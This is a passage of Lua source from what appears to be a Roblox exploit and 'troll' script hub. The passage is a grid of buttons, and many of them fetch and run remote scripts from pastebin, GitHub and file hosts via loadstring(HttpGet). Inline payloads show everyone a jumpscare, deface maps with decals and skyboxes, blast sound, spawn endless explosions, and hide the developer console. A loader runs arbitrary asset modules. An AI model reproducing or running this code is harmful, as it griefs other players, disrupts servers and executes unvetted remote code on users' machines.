AddButton(SPage4, "Ultimate Troll Gui for Brookhaven", X3Y6, function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-Victory-Hub-OFICIAL-NEW-VERSION-53754"))()
end)
AddButton(SPage4, "Destruction Gui", X4Y6, function()

end)
AddButton(SPage4, "Goofy ahh Skybox", X1Y7, function()

end)
AddButton(SPage4, "Stummy Gun", X2Y7, function()
loadstring(game:HttpGet("https://pastebin.com/raw/3XPaYv08"))()
end)
AddButton(SPage4, "Arc of Mystic", X3Y7)
AddButton(SPage4, "Voidware hub", X4Y7, function()
loadstring(game:HttpGet("https://rawscripts.net/raw/99-Nights-in-the-Forest-VOIDWARE-99-NIGHTS-49764"))()
end)

AddButton(SPage5, "Cacudus", X1Y1, function()

end)
AddButton(SPage5, "Topk3k V3.0", X2Y1, function()

end)
AddButton(SPage5, "Topk3k V4.0", X3Y1)
AddButton(SPage5, "Topk3k V5.3", X4Y1, function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/radiuscool/topkek/refs/heads/main/adsdsaadsdassad'))()
end)
AddButton(SPage5, "PipeBomb Launcher", X1Y2, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ProBypasserHax1/Idkkk/refs/heads/main/PipeBomb%20Launcher.txt"))()
end)
AddButton(SPage5, "Red Sword Pickaxe", X2Y2, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ProBypasserHax1/Idkkk/refs/heads/main/Red%20Sword%20Pickaxe.txt"))()
end)
AddButton(SPage5, "Domminant V5.0.1", X3Y2, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ProBypasserHax1/Idkkk/refs/heads/main/dominat501.txt"))()
end)
AddButton(SPage5, "FE Btools", X4Y2, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ProBypasserHax1/Idkkk/refs/heads/main/Btools%20(Lua)"))()
end)
AddButton(SPage5, "SSP by ProBypasserHax1", X1Y3, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ProBypasserHax1/Idkkk/refs/heads/main/Secret%20Service%20Panel.txt.sh"))()
end)
AddButton(SPage5, "Airstrike Tool", X2Y3, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ProBypasserHax1/Idkkk/refs/heads/main/airstrike.txt"))()
end)
AddButton(SPage5, "Devesto Jumpscare", X3Y3, function()
local gui = Instance.new("ScreenGui", nil)
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.SafeAreaCompatibility = "None"
gui.ScreenInsets = "None"
gui.ClipToDeviceSafeArea = true
gui.Name = "JumpscareByLion"
gui.DisplayOrder = 2147483647

local image = Instance.new("ImageLabel", gui)
image.Size = UDim2.new(1, 0, 1)
image.Active = true
image.BackgroundColor3 = Color3.new(0, 0, 0)
image.Image = "rbxassetid://133168176300761"
image.ZIndex = 9999

function ActiveJumpscare()
for i, A in pairs(game.Players:GetDescendants()) do
    if A:IsA("PlayerGui") then
        gui:Clone().Parent = A
    end
end
wait(5)
for z, A in pairs(game.Players:GetDescendants()) do
   if A:IsA("PlayerGui") then
      A:FindFirstChild("JumpscareByLion"):Destroy()
  end
end
end

ActiveJumpscare()
end)
AddButton(SPage5, "Silent Invasion", X4Y3)
AddButton(SPage5, "Operation Noob Event", X1Y4)
AddButton(SPage5, "GreenishDino UTG", X2Y4)
AddButton(SPage5, "Anonymous Particle", X3Y4)
AddButton(SPage5, "Smurf Cat", X4Y4)
AddButton(SPage5, "A-10 Thunerbolt", X1Y5)
AddButton(SPage5, "F*cked Up by Devesto", X2Y5, function()
local function COROTINE()
	local script = Instance.new("LocalScript", game:GetService("ReplicatedFirst"))
	
	local Image = "rbxassetid://133168176300761"
	wait(10)
		local Sound = Instance.new("Sound", game:GetService("SoundService"))
	Sound.Name = "Lol"
	Sound.SoundId = "rbxassetid://9067444671"
	Sound.Volume = 999
	Sound:Play()
	local gui = Instance.new("ScreenGui", nil)
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.SafeAreaCompatibility = "None"
gui.ScreenInsets = "None"
gui.ClipToDeviceSafeArea = true
gui.Name = "JumpscareByLion"
gui.DisplayOrder = 2147483647

local image = Instance.new("ImageLabel", gui)
image.Size = UDim2.new(1, 0, 1)
image.Active = true
image.BackgroundColor3 = Color3.new(0, 0, 0)
image.Image = "rbxassetid://133168176300761"
image.ZIndex = 9999

function ActiveJumpscare()
for i, A in pairs(game.Players:GetDescendants()) do
    if A:IsA("PlayerGui") then
        gui:Clone().Parent = A
    end
end
wait(5)
for z, A in pairs(game.Players:GetDescendants()) do
   if A:IsA("PlayerGui") then
      A:FindFirstChild("JumpscareByLion"):Destroy()
  end
end
end

ActiveJumpscare()
	for i, v in pairs(workspace:GetDescendants()) do
	if v:IsA("Part") then
		local Decal1 = Instance.new("Decal", v)
		Decal1.Texture = Image
		Decal1.Face = "Top"
		local Decal2 = Instance.new("Decal", v)
		Decal2.Texture = Image
		Decal2.Face = "Bottom"
		local Decal3 = Instance.new("Decal", v)
		Decal3.Texture = Image
		Decal3.Face = "Front"
		local Decal4 = Instance.new("Decal", v)
		Decal4.Texture = Image
		Decal4.Face = "Back"
		local Decal5 = Instance.new("Decal", v)
		Decal5.Texture = Image
		Decal5.Face = "Left"
		local Decal6 = Instance.new("Decal", v)
		Decal6.Texture = Image
		Decal6.Face = "Right"
	end
end

local Skybox = Instance.new("Sky", game.Lighting)
Skybox.SkyboxBk = Image
Skybox.SkyboxDn = Image
Skybox.SkyboxFt = Image
Skybox.SkyboxLf = Image
Skybox.SkyboxRt = Image
Skybox.SkyboxUp = Image
local Sound = Instance.new("Sound", game:GetService("SoundService"))
	Sound.Name = "Bossfight"
	Sound.SoundId = "rbxassetid://131902818695416"
	Sound.Volume = 999
	Sound.Looped = true
	Sound.PlaybackSpeed = 0.7
	Sound:Play()
	
local h = Instance.new("Hint", workspace)
h.Text = "D3V3ST0 IN HERE THERE IS NO ESCAPE ANYMORE | F*cked Up by Devesto Script by LIONARCH_HELON | Youtube : @LIONARC_HELON"
end
coroutine.wrap(COROTINE)()
end)
AddButton(SPage5, "Mario.exe", X3Y5)
AddButton(SPage5, "Serverside Executor", X4Y5)
AddButton(SPage5, "Ultimate troll gui by LIONARCH_HELON", X1Y6)
AddButton(SPage5, "K1NG GU1 Executor", X2Y6)
AddButton(SPage5, "K1NG GU1", X3Y6)
AddButton(SPage5, "Private gui by Anonymous", X4Y6)
AddButton(SPage5, "Broken Wi-fi", X1Y7)
AddButton(SPage5, "Project Secret by Team Secret", X2Y7)
AddButton(SPage5, "Project LIONARCH_HELON V8", X3Y7)
AddButton(SPage5, "ELLMODZ Require loader", X4Y7, function()
local gui = Instance.new("ScreenGui")
gui.Name = "Lol"
gui.Parent = game.CoreGui
gui.ResetOnSpawn = false

--///patrick gui maker///--


local Men = Instance.new("Frame")
Men.Size = UDim2.new(0, 400, 0, 180)
Men.Position = UDim2.new(0, 0, 0, 0)
Men.BackgroundColor3 = Color3.fromRGB(140, 140, 140)
Men.BorderColor3 = Color3.new(0, 0, 0)
Men.BorderSizePixel = 2
Men.Active = true
Men.BackgroundTransparency = 0 
Men.Draggable = true
Men.Parent = gui


local Label = Instance.new("TextLabel")
Label.Size = UDim2.new(1, 0, 0, 30)
Label.Position = UDim2.new(0, 0, 0, 0)
Label.BackgroundColor3 = Color3.new(1, 1, 1)
Label.BorderColor3 = Color3.new(0, 0, 0)
Label.BorderSizePixel = 0
Label.Text = "ELLMODZ Require Loader"
Label.BackgroundTransparency = 1 
Label.TextColor3 = Color3.new(1, 1, 1)
Label.Font = Enum.Font.Gotham
Label.Parent = Men
Label.TextSize = 20

local Input = Instance.new("TextBox")
Input.Size = UDim2.new(1, 0, 0, 70)
Input.Position = UDim2.new(0, 0, 0, 40)
Input.BackgroundColor3 = Color3.new(0, 0, 0)
Input.BorderColor3 = Color3.new(0, 0, 0)
Input.BorderSizePixel = 0
Input.Text = ""
Input.PlaceholderText = 'require(1234567890):Load("Username")'
Input.TextColor3 = Color3.new(1, 1, 1)
Input.BackgroundTransparency = 0
Input.Font = Enum.Font.Code
Input.TextSize = 15
Input.Parent = Men
Input.ClearTextOnFocus = false
Input.TextWrap = true

local Execute = Instance.new("TextButton")
Execute.Size = UDim2.new(0, 120, 0, 50)
Execute.Position = UDim2.new(0, 5, 0, 120)
Execute.BackgroundColor3 = Color3.new(0, 0, 0)
Execute.BorderColor3 = Color3.new(0, 0, 0)
Execute.BorderSizePixel = 1
Execute.Text = "Execute"
Execute.BackgroundTransparency = 0 
Execute.TextColor3 = Color3.new(255, 255, 255)
Execute.Font = Enum.Font.Code
Execute.Parent = Men
Execute.TextSize = 20
Execute.MouseButton1Click:Connect(function()
local scriptText = Input.Text
	local assetId = scriptText:match("require%s*%(?%s*(%d+)%s*%)?")

	if assetId then
		local success, result = pcall(function()
			local objects = game:GetObjects("rbxassetid://" .. assetId)
			local obj = objects[1]
			if obj then
				obj.Parent = game.Players.LocalPlayer.PlayerGui
				obj:Clone().Parent = workspace
				if obj:IsA("ModuleScript") then
					local modSuccess, modResult = pcall(function()
						return require(obj)(game.Players.LocalPlayer)
					end)
					if not modSuccess then
						warn("Error requiring module:", modResult)
					end
				end
			end
		end)
		if not success then
			warn("Error loading asset:", result)
		end
	else
		warn("Invalid require() syntax.\n    CallStack : \n Requiring asset "..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." . \n Required_asset_"..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." .MainModule, line 1 - by\n Required_asset_"..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." .MainModule, line 1 - by\n Required_asset_"..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." .MainModule, line 1 - by\n Required_asset_"..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10)..math.random(1, 10).." .MainModule, line 1 - by ")
	end
end)

local Clear = Instance.new("TextButton")
Clear.Size = UDim2.new(0, 120, 0, 50)
Clear.Position = UDim2.new(0, 275, 0, 120)
Clear.BackgroundColor3 = Color3.new(0, 0, 0)
Clear.BorderColor3 = Color3.new(0, 0, 0)
Clear.BorderSizePixel = 1
Clear.Text = "Clear"
Clear.BackgroundTransparency = 0 
Clear.TextColor3 = Color3.new(255, 255, 255)
Clear.Font = Enum.Font.Code
Clear.Parent = Men
Clear.TextSize = 20
	Input.Text = ""
end)

AddButton(SPage6, "C00lgui", X1Y1, function()

end)
AddButton(SPage6, "K00pkidd V10", X2Y1, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/c-1-23/c-1-23/refs/heads/main/K00pkidd%20v11"))()
end)
AddButton(SPage6, "Mulpan Backdoor", X3Y1, function()

end)
AddButton(SPage6, "SSP By U53RDV_7283", X4Y1, function()

end)
AddButton(SPage6, "Anti Logger", X1Y2, function()
local function COROTINE()
	local script = Instance.new("LocalScript", game:GetService("ReplicatedFirst"))
	
	while task.wait() do
		if game.CoreGui:FindFirstChild("DevConsoleMaster") then
			game.CoreGui:FindFirstChild("DevConsoleMaster"):Destroy()
		end
	end
end
coroutine.wrap(COROTINE)()
end)
AddButton(SPage6, "Town of Robloxia", X2Y2)
AddButton(SPage6, "Trump Titan", X3Y2, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BTitans%5D%20Trump", true))()
end)
AddButton(SPage6, "iOrb 2.0 admim", X4Y2, function()
loadstring(game:HttpGet("https://files.catbox.moe/uhtmgb.lua", true))()
end)
AddButton(SPage6, "YourMom Admin", X1Y3, function()
loadstring(game:GetObjects('rbxassetid://289110135')[1].Source)()
end)
AddButton(SPage6, "Dev-Uzi", X2Y3, function()
loadstring(game:HttpGet("https://pastebin.com/raw/X2n20xqM", true))()
end)
AddButton(SPage6, "Hospital", X3Y3, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/refs/heads/main/%5BMap%5D%20Hospital"))()
end)
AddButton(SPage6, "", X4Y3)
AddButton(SPage6, "Free Robux Virus PSA", X1Y4)
AddButton(SPage6, "Nuke Targetor", X2Y4)
AddButton(SPage6, "H*ntai Ui", X3Y4)
AddButton(SPage6, "N00t! N00t!", X4Y4, function()
local msg = Instance.new("Message",workspace)

msg.Text = "SubToSyntax64 (Pingu) And Xeradius (AzuLX). - Noot Noot Script"

wait(2)

msg:Destroy()

pingudecal = "http://www.roblox.com/asset/?id=382332426"

local didpingu = false

local ScreenGui = Instance.new("ScreenGui",game.Players.LocalPlayer.PlayerGui)

ScreenGui.Name = "nooties"

local asd = Instance.new("TextButton",ScreenGui)

asd.BackgroundColor3 = Color3.new(0,0,0)

asd.BorderColor3 = Color3.new(0,0,0)

asd.Name = "nooties"

asd.Position = UDim2.new(1,-150,1,-90)

asd.Size = UDim2.new(0,150,0,45)

asd.Font = "SourceSansBold"

asd.FontSize = "Size32"

asd.Text = "Noot Noot!"

asd.TextColor3 = Color3.new(255,255,255)

asd.MouseButton1Down:connect(function()

	if didpingu == false then

		didpingu = true

		for i,v in pairs(game.Players:GetChildren()) do

			if v:IsA("Player") then

				local nooties = Instance.new("Sound",workspace)

				nooties.SoundId = "http://www.roblox.com/asset/?id=142912516"

				nooties.Volume = 10
				nooties.Looped = true

				nooties:Play()

			end

		end

		wait(12)

		local Sky = Instance.new("Sky",game.Lighting)

		Sky.SkyboxBk = pingudecal

		Sky.SkyboxDn = pingudecal

		Sky.SkyboxFt = pingudecal

		Sky.SkyboxLf = pingudecal

		Sky.SkyboxRt = pingudecal

		Sky.SkyboxUp = pingudecal

		local function modelasd()

			for i,v in pairs(workspace:GetChildren()) do

				if v:IsA("Model") then

					for i,a in pairs(v:GetChildren()) do

						local top = Instance.new("Decal",a)

						top.Face = "Top"

						top.Texture = pingudecal

						local btm = Instance.new("Decal",a)

						btm.Face = "Bottom"

						btm.Texture = pingudecal

						local lft = Instance.new("Decal",a)

						lft.Face = "Left"

						lft.Texture = pingudecal

						local rft = Instance.new("Decal",a)

						rft.Face = "Right"

						rft.Texture = pingudecal

						local frnt = Instance.new("Decal",a)

						frnt.Face = "Front"

						frnt.Texture = pingudecal

						local bk = Instance.new("Decal",a)

						bk.Face = "Back"

						bk.Texture = pingudecal

						local VTest = Instance.new("ParticleEmitter") 

						VTest.Parent = a

						VTest.Texture = pingudecal

						VTest.Speed = NumberRange.new(200)

						VTest.Rate = 200

						VTest.Size = NumberSequence.new(10000,10000)

						VTest.Lifetime = NumberRange.new(1000)

						local pepe = coroutine.create(function()

							while wait() do

								local Explosion = Instance.new("Explosion",a)

								Explosion.BlastRadius = 10000

							end

						end)

						coroutine.resume(pepe)

					end

				end

			end

		end

		local function partasd()

			for i,a in pairs(workspace:GetChildren()) do

				local top = Instance.new("Decal",a)

				top.Face = "Top"

				top.Texture = pingudecal

				local btm = Instance.new("Decal",a)

				btm.Face = "Bottom"

				btm.Texture = pingudecal

				local lft = Instance.new("Decal",a)

				lft.Face = "Left"

				lft.Texture = pingudecal

				local rft = Instance.new("Decal",a)

				rft.Face = "Right"

				rft.Texture = pingudecal

				local frnt = Instance.new("Decal",a)

				frnt.Face = "Front"

				frnt.Texture = pingudecal

				local bk = Instance.new("Decal",a)

				bk.Face = "Back"

				bk.Texture = pingudecal

				local VTest = Instance.new("ParticleEmitter") 

				VTest.Parent = a

				VTest.Texture = pingudecal

				VTest.Speed = NumberRange.new(200)

				VTest.Rate = 200

				VTest.Lifetime = NumberRange.new(1000)

				VTest.Size = NumberSequence.new(10000,10000)

				local pepe = coroutine.create(function()

					while wait() do

						if a.Name ~= "Head" or "Torso" or "Left Arm" or "Right Arm" or "Left Leg" or "Right Leg" then

						local Explosion = Instance.new("Explosion",a)

							Explosion.BlastRadius = 10000

						end

						end

					end)

				coroutine.resume(pepe)

			end

		end

		partasd()

		modelasd()

	else

		warn("Already Ran! Did not execute the script!")

	end

end)
end)
AddButton(SPage6, "Skeleton Skybox Dancing", X1Y5)
AddButton(SPage6, "Sugma_V1", X2Y5, function()
loadstring(game:HttpGet("https://pastebin.com/raw/tE127sKS"))()
end)
AddButton(SPage6, "Dual RB Sword", X3Y5)
AddButton(SPage6, "MLG Particle", X4Y5)
AddButton(SPage6, "FilteringEnabled NUKE [DONT]", X1Y6)
AddButton(SPage6, "ELLMODZ City", X2Y6)
AddButton(SPage6, "AlifGGrtrt9 Skybox", X3Y6)
AddButton(SPage6, "Jumpscare Gui", X4Y6)
AddButton(SPage6, "Decomplier660 Script Reader", X1Y7)
AddButton(SPage6, "Force Enable LoadStringEnabled", X2Y7)
AddButton(SPage6, "Private gui by Cle0n", X3Y7)
AddButton(SPage6, "Davin's Map / Realm", X4Y7)

AddButton(SPage7, "Basic Explorer", X1Y1, function()
TextProperties = {"ClassName", "Name", "Value", "Text", "Reflectance", "Transparency", "Heat", "TeamName", "WalkSpeed", "Health", "MaxHealth", "Size", "Position", "AccountAge", "RobloxLocked", "TeamColor", "userId", "Brightness", "Ambient", "TimeOfDay", "FieldOfView", "CameraType", "LinkedSource"}

BoolProperties = {"Anchored", "CanCollide", "Disabled", "Jump", "Sit", "Visible", "Enabled", "Locked", "FilteringEnabled", "StreamingEnabled", "GlobalShadows"}

BrickColorProperties = {"BrickColor", "Color", "TeamColor", "Texture", "Value"}

s = Instance.new("ScreenGui", game.CoreGui)

pgr = Instance.new("TextButton")

pgr.Parent = s

pgr.Size = UDim2.new(0,100,0,40)

pgr.Position = UDim2.new(0,30,0,440)

pgr.Text="Explorer"

pgr.BackgroundTransparency = 0.3

pgr.TextColor = BrickColor.new("White")

pgr.BackgroundColor = BrickColor.new("Really Black")

pgr.BorderColor = BrickColor.new("Black")

pgr.Font = "ArialBold"

pgr.FontSize = "Size14"

pgr.TextStrokeColor3 = Color3.new(0/0,0/0,0/0)

pgr.TextStrokeTransparency = 0.3

pgr.BorderSizePixel = 1

pgr.BorderColor = BrickColor.new("White")



if game.CoreGui:findFirstChild("Explorer") then 

    game.CoreGui:findFirstChild("Explorer"):Remove() 

end



local Cloned

local Deleted

local DeleteParent

local Player

local Search

local ScriptSearch

local Gui

local Cloned = nil

local Deleted = nil

local DeleteParent = nil

local Current = 0

local CurrentOption = 0



function Clear()

    if Gui then 

        Gui:Remove() 

    end

    Current = 0

    CurrentOption = 0

end



function AddButton(N, Function, Color, Copy)

    if not N then 

        error("RenderButton - No Name Specified")

    end

    if not Function then 

        error("RenderButton - No Function Specified") 

    end

    if not Color then 

        Color = Color3.new(1, 1, 1) 

    end

    if Copy == nil then 

        Copy = true 

    end

    P = Instance.new("TextButton")

    if Copy then

        P.Size = UDim2.new(0, 110, 0, 20)

    else

        P.Size = UDim2.new(0, 130, 0, 20)

    end

    P.Text = N.Name

    P.Name = N.Name

    P.Parent = Gui

    P.BackgroundColor3 = Color

    P.TextColor3 = Color3.new(0, 0, 0)

    P.BackgroundTransparency = 0.5

    P.Position = UDim2.new(0, ((math.modf(Current/30))*150)+300, 0, 50+(20*((Current%30)-1)))

    P.MouseButton1Click:connect(function() 

        Function(P) 

    end)

    D = Instance.new("TextButton")

    D.Size = UDim2.new(0, 20, 0, 20)

    D.Text = "X"

    D.Name = N.Name

    D.Parent = Gui

    D.BackgroundColor3 = Color3.new(1, 0, 0)

    D.TextColor3 = Color3.new(0, 0, 0)

    D.BackgroundTransparency = 0.5

    D.Position = UDim2.new(0, ((math.modf(Current/30))*150)+300+130, 0, 50+(20*((Current%30)-1)))

    D.MouseButton1Click:connect(function()

        Deleted = N

        DeleteParent = N.Parent

        N.Parent = nil

        Clear()

        Search(DeleteParent)

    end)

    if Copy then

        C = Instance.new("TextButton")

        C.Size = UDim2.new(0, 20, 0, 20)

        C.Text = "C"

        C.Name = N.Name

        C.Parent = Gui

        C.BackgroundColor3 = Color3.new(0, 1, 0.5)

        C.TextColor3 = Color3.new(0, 0, 0)

        C.BackgroundTransparency = 0.5

        C.Position = UDim2.new(0, ((math.modf(Current/30))*150)+300+110, 0, 50+(20*((Current%30)-1)))

        C.MouseButton1Click:connect(function()

            Cloned = N

            Clear()

            Search(N.Parent)

        end)

    end

    Current = Current + 1

    return P

end

    

function AddOption(N, Function, Color, Text)

    if not N then 

        error("RenderButton - No Name Specified") 

    end

    if not Color then 

        Color = Color3.new(1, 1, 1) 

    end

    if Text == nil then 

        Text = false 

    end

    if Text then

        P = Instance.new("TextBox")

    else

        P = Instance.new("TextButton")

    end

    P.Text = N

    P.Name = N

    P.Parent = Gui

    P.BackgroundColor3 = Color

    P.TextColor3 = Color3.new(0, 0, 0)

    P.BackgroundTransparency = 0.5

    P.Size = UDim2.new(0, 150, 0, 20)

    P.Position = UDim2.new(0, ((math.modf(CurrentOption/30))*150)+150, 0, 50+(20*((CurrentOption%30)-1)))

    if not Text and Function then

        P.MouseButton1Click:connect(function() Function(P) end)

    end

    CurrentOption = CurrentOption + 1

    return P

end



function AddTextOption(Obj, Prop)

    local Ob = Obj

    local Pro = Prop

    if type(Ob[Pro]) == "number" or type(Ob[Pro]) == "string" then

        CurrentOption = CurrentOption + 1

        local T = AddOption(Ob[Pro], nil, Color3.new(0.1, 0.4, 0.1), true)

        CurrentOption = CurrentOption - 2

        local O = AddOption("Change "..Pro..":", function() Ob[Pro] = T.Text end, Color3.new(0.1, 0.8, 0.1), false)

        CurrentOption = CurrentOption + 1

    end

end



function AddBrickColorOption(Obj, Prop)

    local Ob = Obj

    local Pro = Prop

    if BrickColor.new(tostring(Ob[Pro])) == Ob[Pro] then

        CurrentOption = CurrentOption + 1

        local T = AddOption(tostring(Ob[Pro]), nil, Color3.new(0.1, 0.4, 0.1), true)

        CurrentOption = CurrentOption - 2

        local O = AddOption("Change "..Pro..":", function() Ob[Pro] = BrickColor.new(T.Text) end, Color3.new(0.1, 0.8, 0.1), false)

        CurrentOption = CurrentOption + 1

    end

end



function AddBoolOption(Obj, Prop)

    local Ob = Obj

    local Pro = Prop

    if type(Ob[Pro]) == "boolean" then

        local O = AddOption(Pro..": "..tostring(Ob[Pro]), nil, Color3.new(0.1, 0.8, 0.1), false)

        O.MouseButton1Click:connect(function()

            if Ob[Pro] then

                Ob[Pro] = false

                O.Text = Pro..": false"

            else

                Ob[Pro] = true

                O.Text = Pro..": true"

            end

        end)

    end

end



function TestProperty(Obj, Property)

    Success = pcall(function() 

        if Obj[Property] then 

            return 

        end 

    end)

    return Success

end



function LoadOptions(Object)

    for Num, Prop in pairs(TextProperties) do

        if TestProperty(Object, Prop) then

            AddTextOption(Object, Prop)

        end

    end

    for Num, Prop in pairs(BoolProperties) do

        if TestProperty(Object, Prop) then

            AddBoolOption(Object, Prop)

        end

    end

    for Num, Prop in pairs(BrickColorProperties) do

        if TestProperty(Object, Prop) then

            AddBrickColorOption(Object, Prop)

        end

    end

end



function Search(Object)

    Gui = Instance.new("ScreenGui")

    Gui.Parent = game.CoreGui

    Gui.Name = "Explorer"

    if Object ~= game then

        AddOption("Back", function() 

            Clear(); 

            Search(Object.Parent) 

        end, Color3.new(0.5, 1, 1), false)

    end

    AddOption("Reload", function() Clear(); Search(Object); end, Color3.new(0.2, 1, 0.2), false)

    if Cloned then

        AddOption("Paste", function() Cloned:Clone().Parent = Object; Clear(); Search(Object); end, Color3.new(0.5, 1, 1), false)

    end

    if Deleted then

        AddOption("Undo", function() Deleted.Parent = DeleteParent; Deleted = nil; DeletedParent = nil; Clear(); Search(Object); end, Color3.new(1, 0.6, 0.1), false)

    end

    if Object:IsA("Player") then

        AddOption("Goto Character", function() Clear(); if Object.Character then Search(Object.Character); end end, Color3.new(1, 1, 1), false)

    end

    if Object:IsA("LocalScript") then

        AddOption("EditScript", function() Clear(); ScriptSearch(Object); end, Color3.new(1, 1, 1), false)

    end

    if Object:IsA("Terrain") then

        AddOption("Clear", function() Object:Clear(); end, Color3.new(1, 1, 1), false)

    end

    LoadOptions(Object)

    AddOption("Close", Clear, Color3.new(1, 0.2, 0), false)

    if not Object:IsA("Workspace") or not Object:IsA("Player") then

        for Num, Obj in pairs(Object:GetChildren()) do

            --if not Obj:IsA("BasePart") or not Object.Parent == game.Workspace then

            if true then

                if Obj:IsA("LocalScript") then

                    AddButton(Obj, function() Clear(); Search(Obj); end, Color3.new(1, 0, 0), true)

                elseif Obj:IsA("Script") or Obj:IsA("StarterScript") or Obj:IsA("CoreScript") then

                    AddButton(Obj, function() Clear(); Search(Obj); end, Color3.new(0.5, 0.5, 0.8), true)

                elseif Obj.Parent == game then

                    AddButton(Obj, function() Clear(); Search(Obj); end, Color3.new(1, 1, 1), false)

                else

                    AddButton(Obj, function() Clear(); Search(Obj); end, Color3.new(1, 1, 1), true)

                end

            end

        end

    end

    function MoveUp(Place, Amount)

        for i,v in pairs(Place:GetChildren()) do

            if v:IsA("TextLabel") or v:IsA("TextBox") then

                v.Position = v.Position + UDim2.new(0,0,0,-Amount)

            end

        end

    end

    function MoveDown(Place, Amount)

        for i,v in pairs(Place:GetChildren()) do

            if v:IsA("TextLabel") or v:IsA("TextBox") then

                v.Position = v.Position + UDim2.new(0,0,0,Amount)

            end

        end

    end

    i=0

    function ScriptSearch(S)

        Script2 = S

        Script = Script2.Source

        Table = {}

        Enabled = true

        Gui = Instance.new("ScreenGui")

        Gui.Parent = game.CoreGui

        Gui.Name = "Explorer"

        while Enabled do

            Start, End = string.find(Script, '\n')

            print(Start, End)

            if Start and End then

                table.insert(Table, string.sub(Script, 1, End))

                New = string.sub(Script, End+1, string.len(Script))

                Script = New

            else

                Enabled = false

                table.insert(Table, string.sub(Script, 1, End))

                print("Finished")

            end

        end

        P = Instance.new("TextLabel")

        P.Size = UDim2.new(0, 500, 0, 20)

        P.Text = Script2.Name

        P.Name = "Script Line"

        P.Parent = Gui

        P.BackgroundColor3 = Color3.new(1, 1, 1)

        P.TextColor3 = Color3.new(0, 0, 0)

        P.BackgroundTransparency = 0.5

        P.Position = UDim2.new(0.5, -250, 0, 150+(20*(i-1)))

        P.TextXAlignment = "Left"

        i=i+1

        New = {}

        for I,Val in pairs(Table) do

            print(Val)

            P = Instance.new("TextBox")

            P.ClearTextOnFocus = false

            P.Size = UDim2.new(0, 500, 0, 20)

            P.Text = Val

            P.Name = "Script Line"

            P.Parent = Gui

            P.BackgroundColor3 = Color3.new(1, 1, 1)

            P.TextColor3 = Color3.new(0, 0, 0)

            P.BackgroundTransparency = 0.5

            P.Position = UDim2.new(0.5, -250, 0, 150+(20*(i-1)))

            P.TextXAlignment = "Left"

            table.insert(New, P)

            i=i+1

        end

        i=1

        P = Instance.new("TextButton")

        P.Size = UDim2.new(0, 20, 0, 20)

        P.Text = "^"

        P.Name = "Scroll"

        P.Parent = Gui

        P.BackgroundColor3 = Color3.new(1, 1, 1)

        P.TextColor3 = Color3.new(0, 0, 0)

        P.BackgroundTransparency = 0.5

        P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))

        P.MouseButton1Click:connect(function() 

            MoveUp(Gui, -20) 

        end)

        i=i+1

        P = Instance.new("TextButton")

        P.Size = UDim2.new(0, 20, 0, 20)

        P.Text = "v"

        P.Name = "Scroll"

        P.Parent = Gui

        P.BackgroundColor3 = Color3.new(1, 1, 1)

        P.TextColor3 = Color3.new(0, 0, 0)

        P.BackgroundTransparency = 0.5

        P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))

        P.MouseButton1Click:connect(function() 

            MoveDown(Gui, -20) 

        end)

        i=i+1

        P = Instance.new("TextButton")

        P.Size = UDim2.new(0, 20, 0, 20)

        P.Text = "^^"

        P.Name = "Scroll"

        P.Parent = Gui

        P.BackgroundColor3 = Color3.new(1, 1, 1)

        P.TextColor3 = Color3.new(0, 0, 0)

        P.BackgroundTransparency = 0.5

        P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))

        P.MouseButton1Click:connect(function() 

            MoveUp(Gui, -200) 

        end)

        i=i+1

        P = Instance.new("TextButton")

        P.Size = UDim2.new(0, 20, 0, 20)

        P.Text = "vv"

        P.Name = "Scroll"

        P.Parent = Gui

        P.BackgroundColor3 = Color3.new(1, 1, 1)

        P.TextColor3 = Color3.new(0, 0, 0)

        P.BackgroundTransparency = 0.5

        P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))

        P.MouseButton1Click:connect(function() 

            MoveDown(Gui, -200) 

        end)

        i=i+1

        P = Instance.new("TextButton")

        P.Size = UDim2.new(0, 20, 0, 20)

        P.Text = "S"

        P.Name = "Save"

        P.Parent = Gui

        P.BackgroundColor3 = Color3.new(0, 1, 0)

        P.TextColor3 = Color3.new(0, 0, 0)

        P.BackgroundTransparency = 0.5

        P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))

        P.MouseButton1Click:connect(function()

            StringS = ""

            for Num, Obj in pairs(New) do

                StringS = StringS..Obj.Text..'\n'

            end

            S.Source = StringS

            S.Disabled = true

            S.Disabled = false

        end)

        i=i+1

        P = Instance.new("TextButton")

        P.Size = UDim2.new(0, 20, 0, 20)

        P.Text = "x"

        P.Name = "Back"

        P.Parent = Gui

        P.BackgroundColor3 = Color3.new(1, 0.2, 0)

        P.TextColor3 = Color3.new(0, 0, 0)

